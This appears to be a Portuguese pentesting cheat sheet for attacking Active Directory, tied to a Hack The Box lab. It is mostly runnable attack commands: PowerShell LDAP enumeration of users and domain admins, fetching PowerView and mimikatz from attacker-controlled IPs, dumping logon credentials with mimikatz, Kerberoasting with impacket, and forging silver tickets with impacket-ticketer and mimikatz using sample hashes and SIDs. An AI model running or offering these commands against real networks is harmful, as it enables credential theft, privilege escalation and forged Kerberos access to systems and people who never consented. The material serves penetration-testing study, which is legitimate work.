Active Directory Exploitation
========================
## Enumerar hashes de senha



Vale considerar que já deixei as credenciais salvas para evitar problemas


## 2 - Enumeração manual

### Powershell

Enumeração de usuários

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"; $SearchString += $DistinguishedName; $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString); $objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter="samAccountType=805306368";$Searcher.FindAll()
```

Enumeração de usuários (com mais detalhes):

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"; $SearchString += $DistinguishedName; $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString); $objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter="samAccountType=805306368";$Result = $Searcher.FindAll(); Foreach($obj in $Result){Foreach($prop in $obj.Properties){$prop}Write-Host "------------------------"}
```

Enumerar grupos:

```
$ldapFilter = "(objectClass=Group)";$domain = New-Object System.DirectoryServices.DirectoryEntry; $search = New-Object System.DirectoryServices.DirectorySearcher; $search.SearchRoot = $domain; $search.PageSize = 1000; $search.Filter = $ldapFilter; $search.SearchScope = "Subtree";$results = $search.FindAll();foreach ($result in $results){$result.Properties.name}
```

Membros dos grupos:

```
$ldap_filter = "(name=LAPS_Readers)"; $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))";$SearchString += $DistinguishedName;$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString);$objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter=$ldap_filter;$Result = $Searcher.FindAll(); Foreach($obj in $Result) {$obj.Properties.member}
```

Enumerar domain admins:
```
$ldap_filter = "(|(name=Domain Admins)(name=Administrators))"; $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))";$SearchString += $DistinguishedName;$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString);$objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter=$ldap_filter;$Result = $Searcher.FindAll(); Foreach($obj in $Result) {$obj.Properties.member}
```

#### PowerView


```
(new-object net.webclient).downloadfile('http://10.10.14.17/PowerView.ps1', 'c:\temp\pv.ps1')
. .\pv.ps1
get-netsession -computername htb.local
get-netloggedon -computername htb.local
```

    get-netdomain
    
    get-domainuser "user1" #olhar um usuário específico

### Winpeas



### Enumerar hashes users (AsRep Roasting)



**NESTA ETAPA É INTERESSANTE QUE TENHAMOS FEITO A ESCALAÇÃO DE PRIVILÉGIO PARA CONSEGUIR CONDUZIR MAIS ALGUNS TESTES, SENDO ELES:**

```
wget http://10.10.10.10/6-ADTools/mimikatz/x64/mimikatz.exe -O m.exe
#ou 
copy \\192.168.0.165\smb\mimikatz.exe c:\temp\m.exe
```

```
./m.exe
privilege::debug
sekurlsa::logonpasswords
```

Agora já temos condições do obter os hashes de senhas necessários por meio do seguinte comando:


```
impacket-GetUserSPNs scrm.local/ksimpson -k -no-pass -request -dc-host dc1.scrm.local
```

**Dar atenção neste último comando, pois o nome do -dc-host deve ser conforme está no registro de DNS pra que o comando funcione corretamente.**

Agora, temos de fazer o silver ticket

### Silver ticket

Aqui precisamos de algumas informações. **Não necessitamos de um usuário com privilégio administrativo pra esse cara. Isso é IMPORTANTE.**

Então temos que ir atrás de:

1\) Domain SID

2\) Hash

3\) Nome do domínio

4\) SPN

#### Obtendo o domain SID

```
impacket-getPac -targetUser administrator domain/user:password
```

```
impacket-getPac -targetUser administrator scrm.local/ksimpson:ksimpson
```

**Obtendo o silver ticket**

```
impacket-ticketer -nthash 5f38c0485f0c23f8dedf9bf23ffa5336  -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -dc-ip dc1.scrm.local -spn MSSQLSvc/dc1.scrm.local:1433 administrator
```

Caso já tenha acesso na máquina

```
whoami /user
#Daí, com o mimikatz, a gente faz o seguinte:
./m.exe
kerberos::list
kerberos::golden /user:user /domain:domain.com /sid:domain-SID /target:SPN /service:HTTP
/rc4:NTLM /ptt
#Exemplo
kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-
2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP
/rc4:E2B475C11DA2A0748290D87AA966C327 /ptt

kerberos::list
```

Tem a demonstração deste ataque no seguinte vídeo (Scrambled - Hack the box):

{% embed url="https://www.youtube.com/watch?v=_8FE3JZIPfo&ab_channel=IppSec" %}

[https://www.hackingarticles.in/lateral-movement-pass-the-ccache/](https://www.hackingarticles.in/lateral-movement-pass-the-ccache/)



